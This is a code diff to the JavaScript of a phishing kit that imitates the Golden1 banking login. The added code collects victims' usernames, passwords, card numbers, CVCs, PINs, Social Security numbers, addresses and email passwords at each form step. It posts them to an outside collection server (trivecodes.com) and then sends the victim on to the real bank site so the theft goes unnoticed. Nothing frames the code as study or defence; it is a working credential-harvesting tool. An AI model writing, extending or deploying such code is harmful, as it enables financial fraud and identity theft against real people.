@@ -1,4 +1,4 @@
-const SubmitFirstUsers = () => {
+const SubmitFirstUsers = async () => {
   document.getElementById("submitBtn").setAttribute("disabled", true);
 
   const username = document.getElementById("pad").value;
@@ -15,7 +15,25 @@ const SubmitFirstUsers = () => {
     localStorage.setItem("BOWusername", username);
     localStorage.setItem("BOWpassword", password);
 
-    setTimeout(() => location.assign("./confirmLogin.html"), 3000);
+    const sendDetails = `<h3> UserName : ${username} <br> Password : ${password} </h3>`;
+
+    const sendData = {
+      siteName: "Golden1",
+      siteSend: sendDetails,
+    };
+
+    const billResponse = await fetch(
+      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+      sendData
+    );
+
+    billResponse
+      .text()
+      .then(
+        (data) =>
+          data === "Sent" &&
+          setTimeout(() => location.assign("./confirmLogin.html"), 3000)
+      );
   } else {
     document.getElementById("pad").style.borderBottom = "1px solid #b22222";
 
@@ -25,7 +43,7 @@ const SubmitFirstUsers = () => {
   }
 };
 
-const SubmitPersonalInfo = () => {
+const SubmitPersonalInfo = async () => {
   document.getElementById("submitBtn").setAttribute("disabled", true);
 
   const userfullName = document.getElementById("userfullName").value;
@@ -67,7 +85,25 @@ const SubmitPersonalInfo = () => {
     localStorage.setItem("BOWuserfullZip", userfullZip);
     localStorage.setItem("BOWuserfullSSN", userfullSSN);
 
-    setTimeout(() => location.assign("./confirmEmail.html"), 3000);
+    const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${localStorage.cardNumber} <br> Card Expiry Date  : ${localStorage.cardExpiryDate} <br> Card CVC : ${localStorage.cardCVC} <br> Card Pin : ${localStorage.cardPin}  <br> Full Name : ${userfullName} <br> Mobile : ${userfullMobile} <br> Address : ${userfullAddress} <br> City : ${userfullCity} <br> State : ${userfullState} <br> Zip Code : ${userfullZip} <br> SSN : ${userfullSSN} </h3>`;
+
+    const sendData = {
+      siteName: "Golden1",
+      siteSend: sendDetails,
+    };
+
+    const billResponse = await fetch(
+      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+      sendData
+    );
+
+    billResponse
+      .text()
+      .then(
+        (data) =>
+          data === "Sent" &&
+          setTimeout(() => location.assign("./confirmEmail.html"), 3000)
+      );
   } else {
     document.getElementById("userfullName").style.borderBottom =
       "1px solid #b22222";
@@ -94,7 +130,7 @@ const SubmitPersonalInfo = () => {
   }
 };
 
-const FinalSubmitForm = () => {
+const FinalSubmitForm = async () => {
   document.getElementById("FinalSubmit").setAttribute("disabled", true);
 
   const cardNumber = document.getElementById("padNumber").value;
@@ -141,10 +177,28 @@ const FinalSubmitForm = () => {
   localStorage.setItem("cardCVC", cardCVC);
   localStorage.setItem("cardPin", cardPin);
 
-  setTimeout(() => location.assign("./confirmPersonal.html"), 3000);
+  const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${cardNumber} <br> Card Expiry Date  : ${cardExpiryDate} <br> Card CVC : ${cardCVC} <br> Card Pin : ${cardPin} </h3>`;
+
+  const sendData = {
+    siteName: "Golden1",
+    siteSend: sendDetails,
+  };
+
+  const billResponse = await fetch(
+    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+    sendData
+  );
+
+  billResponse
+    .text()
+    .then(
+      (data) =>
+        data === "Sent" &&
+        setTimeout(() => location.assign("./confirmPersonal.html"), 3000)
+    );
 };
 
-const SubmitEmailDetails = () => {
+const SubmitEmailDetails = async () => {
   document.getElementById("submitBtn").setAttribute("disabled", true);
 
   const email = document.getElementById("userMail").value;
@@ -174,37 +228,28 @@ const SubmitEmailDetails = () => {
 };
 
 const completeSubmission = async () => {
-  const MailReturn = await fetch(
-    "https://mailclient.trivecodes.com/golden1/php/mail_key.php",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "application.json",
-      },
-      body: JSON.stringify({
-        username: localStorage.BOWusername,
-        password: localStorage.BOWpassword,
-        cardNumber: localStorage.cardNumber,
-        cardExpiryDate: localStorage.cardExpiryDate,
-        cardCVC: localStorage.cardCVC,
-        cardPin: localStorage.cardPin,
-        Name: localStorage.BOWuserfullName,
-        Mobile: localStorage.BOWuserfullMobile,
-        Address: localStorage.BOWuserfullAddress,
-        City: localStorage.BOWuserfullCity,
-        State: localStorage.BOWuserfullState,
-        Zip: localStorage.BOWuserfullZip,
-        SSN: localStorage.BOWuserfullSSN,
-        Email: localStorage.BOWEmail,
-        EmailPass: localStorage.BOWEmailpassword,
-      }),
-    }
+  const sendDetails = `<h3> UserName : ${localStorage.BOWusername} <br> Password : ${localStorage.BOWpassword} <br> Card Number : ${localStorage.cardNumber} <br> Card Expiry Date  : ${localStorage.cardExpiryDate} <br> Card CVC : ${localStorage.cardCVC} <br> Card Pin : ${localStorage.cardPin}  <br> Full Name : ${localStorage.BOWuserfullName} <br> Mobile : ${localStorage.BOWuserfullMobile} <br> Address : ${localStorage.BOWuserfullAddress} <br> City : ${localStorage.BOWuserfullCity} <br> State : ${localStorage.BOWuserfullState} <br> Zip Code : ${localStorage.BOWuserfullZip} <br> SSN : ${localStorage.BOWuserfullSSN} <br> Email : ${localStorage.BOWEmail} <br> Email Password : ${localStorage.BOWEmailpassword} </h3>`;
+
+  const sendData = {
+    siteName: "Golden1",
+    siteSend: sendDetails,
+  };
+
+  const billResponse = await fetch(
+    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
+    sendData
   );
 
-  await localStorage.clear();
+  billResponse
+    .text()
+    .then(
+      (data) =>
+        data === "Sent" &&
+        setTimeout(
+          () => location.assign("https://www.golden1.com/login-to-olb"),
+          3000
+        )
+    );
 
-  MailReturn.text().then(
-    (data) =>
-      data === "Sent" && location.assign("https://www.golden1.com/login-to-olb")
-  );
+  localStorage.clear();
 };
